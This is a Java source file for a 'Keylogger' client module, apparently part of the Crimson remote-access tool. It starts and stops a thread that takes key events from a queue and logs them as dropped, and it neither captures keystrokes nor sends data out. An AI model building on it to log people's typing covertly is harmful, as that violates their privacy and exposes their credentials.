/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.modules;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.proto.msg.Keylogger.KEvent;

public enum Keylogger {
	;
	private static final Logger log = LoggerFactory.getLogger(Keylogger.class);

	private static Thread monitor;

	public static BlockingQueue<KEvent> buffer = new ArrayBlockingQueue<KEvent>(512);

	public static void start() {
		stop();
		log.info("Starting keylogger");
		monitor = new Thread(new Runnable() {
			public void run() {
				KEvent k;
				try {
					while (!monitor.isInterrupted()) {
						k = buffer.take();
						log.info("Dropping key event: " + k.getEvent());
					}
				} catch (InterruptedException e) {
					log.info("Exited monitoring thread");
				}

			}
		});
		monitor.start();
	}

	public static void stop() {
		if (monitor != null) {
			log.info("Stopping keylogger");
			monitor.interrupt();
			monitor = null;
		}

	}

	public static boolean isLogging() {
		return monitor == null ? false : monitor.isAlive();
	}

}
